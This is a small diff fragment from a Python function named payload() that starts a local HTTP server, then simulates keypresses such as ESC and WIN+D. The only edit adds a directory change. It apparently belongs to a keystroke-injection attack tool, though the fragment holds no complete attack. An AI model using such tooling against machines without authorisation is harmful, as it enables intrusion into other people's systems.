@@ -77,7 +77,7 @@ def payload():
 	httpd = socketserver.TCPServer(('',8000),httpHandler)
 	httplistener=Process(target=httpd.handle_request)
 	httplistener.start()
-
+	os.chdir("..")
 	eco.press("ESC")
 	sleep(1)
 	eco.press("WIN+D")
